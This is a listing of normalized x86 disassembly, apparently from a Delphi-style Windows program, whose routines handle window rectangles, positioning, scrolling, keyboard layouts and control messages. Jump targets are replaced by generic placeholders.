push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4493d8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_447ed0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_447e3c
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a468
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_447f10
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405a50
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405a50
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_447f7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_448024
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44802b
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_440864
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403234
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405a38
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403430
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405a50
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ edi + 0x178 ] eax
sub_448034
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_445c38
xor edx edx
push ebp
push sub_4480f6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403430
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4480fd
mov eax [ ebp - 0x4 ]
call sub_445c40
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4480fd
mov eax [ ebp - 0x4 ]
call sub_4599ec
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_442e18
sub_448148
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40317c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444a2c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4481b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_442e18
sub_4481cc
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_4481f4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4599ec
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4598f4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403430
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4481f4
test al al
jne r-xdata
sub_44825c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4481f4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44a524
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_448288
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4481f4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44a524
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4482b4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_4482dc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4599ec
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4598f4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403430
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4482dc
test al al
jne r-xdata
sub_448344
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4482dc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_448364
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4482dc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4483a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4599ec
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403430
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4483a4
test al al
jne r-xdata
sub_448408
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4483a4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_448428
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_446094
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_443d6c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_448428
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_4484d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_448428
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_4599ec
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_443d6c
test eax eax
jne r-xdata
sub_448580
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4485a0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_447020
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4485d4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4485f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_448644
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_448668
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_441e84
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4460d0
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_446094
mov dl [ esp ]
mov si 0xffd1
call sub_403430
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4486c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403430
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4486e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403430
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44871c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444840
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_446130
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_446940
sub_448754
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403430
pop esi
pop ebx
retn
mov eax ebx
call sub_4431fc
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4044c8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4044c8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_4487d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446d20
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_444914
sub_448834
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_446a94
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_445e90
pop ebx
retn
sub_448864
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44888c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_445e90
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4488fc
push ebx
mov ebx eax
mov eax ebx
call sub_444780
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_446130
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_423ab8
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_443d6c
sub_448938
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_441464
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4493d8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_443d6c
sub_448978
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4496dc
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4493d8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4489b8
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_446130
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_4492e0
sub_4489f8
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_449518
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_449518
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_448a58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4437c8
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4426fc
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_446c8c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_448ac8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4448b8
mov edx esi
mov eax ebx
call sub_4460f0
pop esi
pop ebx
retn
sub_448ae4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43faf4
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_4599ec
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403430
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403430
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403430
test al al
jne r-xdata
sub_448b78
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44a524
mov edx esi
mov eax ebx
call sub_448ae4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_443d6c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_443d6c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_443d6c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4599ec
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_443d6c
test eax eax
jne r-xdata
jmp r-xdata
sub_448c5c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_443d6c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_448cb0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_443d6c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4599ec
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_443d6c
test eax eax
jne r-xdata
sub_448cfc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_448ae4
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_443d6c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4599ec
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_443d6c
test eax eax
jne r-xdata
sub_448d58
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4599ec
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_443d6c
mov [ esi + 0xc ] eax
sub_448d8c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44220c
mov eax ebx
mov si 0xffd0
call sub_403430
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_442558
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_448e64
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_4460d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_446094
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403430
inc edi
dec ebx
jne r-xdata
sub_448eac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445c38
xor eax eax
push ebp
push sub_448f4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448e64
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4427d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f51
mov eax [ ebp - 0x4 ]
call sub_445c40
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_448f58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_445c60
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_446094
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_449048
